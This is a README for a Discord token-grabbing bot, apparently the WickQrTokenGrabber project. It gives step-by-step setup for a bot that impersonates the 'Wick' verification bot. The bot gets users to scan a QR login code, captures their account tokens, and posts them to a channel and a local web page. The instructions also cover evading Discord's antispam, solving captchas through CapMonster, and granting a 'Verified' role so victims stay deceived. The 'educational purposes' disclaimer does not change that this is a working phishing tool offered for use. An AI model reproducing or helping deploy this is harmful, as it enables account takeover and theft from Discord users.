## Features

- **Looks exactly like a real bot.** (when configured correctly)
- **Efficient memory usage.** (doesn't use chromedriver.exe or any browser)
- **Very stable and robust.** (minimal failures and errors)
- **Unique working method** (doesn't use chromedriver.exe)
- **Customizable** (change all appearance settings to fit your server)

## Disclaimers

- This is a bot that is not affiliated with any of the Discord teams or Discord Inc.
- This was made for educational purposes. It is not intended to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damages that may occur.
- You must have a <a href="https://capmonster.cloud">CapMonster</a> account with funds for optimal performance.

## How it works

- The bot uses a WebSocket to connect to the Discord API to retrieve a login.
- The login session then sends the bot a URL to generate a QR code for the user to scan.
- After the user scans the QR code, the bot will retrieve the token and send it to a channel.

## Configuration

- **Prerequisites for installation** You will need these to be able to run the Discord bot.
  - [Node LTS](https://nodejs.org/en/)
  - [Git](https://git-scm.com/downloads)
- **Clone Repository and Install Dependencies**
  - `git clone https://github.com/ulnk/scam.git`
  - `npm install`
- **Create a new Discord Bot**
  - **Enable all intents for the bot** This is very important. If you don't enable all intents, the bot won't work.
    - https://discord.dev **Bot** > **Privileged Gateway**
  - **For best results** Discord has an antispam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources found [here](https://github.com/k4itrun/WickQrTokenGrabber/tree/master/profile). To fit with the profile, change the bot's name to 'Wick' and set the profile picture as provided.
  - **Invite the bot to your server** Use the following link to invite your bot to your server. Change `CLIENTID` to your Discord bot's ID.
    - To get the bot's ID > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configure the Project**
  - Change the name of `ex.config.json` to `config.json`. This is located in `src/ex.config.json`.
  - Edit all keys and their values. It is not required to give a value to capmonster, however it is recommended.
  - When entering `log.guildId` and `log.channelId`, you must enter the ID of the server and channel where the bot is located. Otherwise, the bot won't be able to send the token and will crash.
- **Simulate Real Verification Bot**
  - In every server where you want the bot to be, create a new role called "Verified". (Make sure the role is below the bot)
  - Use the command `/role` to set the role ID to the role you just created.
  - This will be given to the user after scanning the QR code.
- **Start the Bot**
  - `npm start`
  - Once the bot is active, use the command `/spawn` to generate the verification message.
  - The port **3000** will also be opened at [localhost:3000](http://localhost:3000/), and the tokens taken from the QR code can be found at [localhost:3000/tokens](http://localhost:3000/tokens).

(_unique executable file coming soon_)

## Preview Image

![Preview](https://user-images.githubusercontent.com/93608862/224277763-d9734632-2469-4b98-b239-27cd6c3247e9.png)

## Used Libraries

- **discord.js** (discord bot) <img alt="Preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (private and public keys) <img alt="Preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="Preview badge" src="https://img.shields.io/npm/v/ws">
- **capmonster** (anti-captcha) <img alt="Preview badge" src="https://img.shields.io/npm/v/node-capmonster">

## Idk

[X] If you need help, contact **yvk4itrun** (https://discord.com/users/1088554690268119103) or add me as **yvk4itrun**

[X] Credits to **k4itrun** & **End**

# DUALHOOK Testing only and with solved errors.
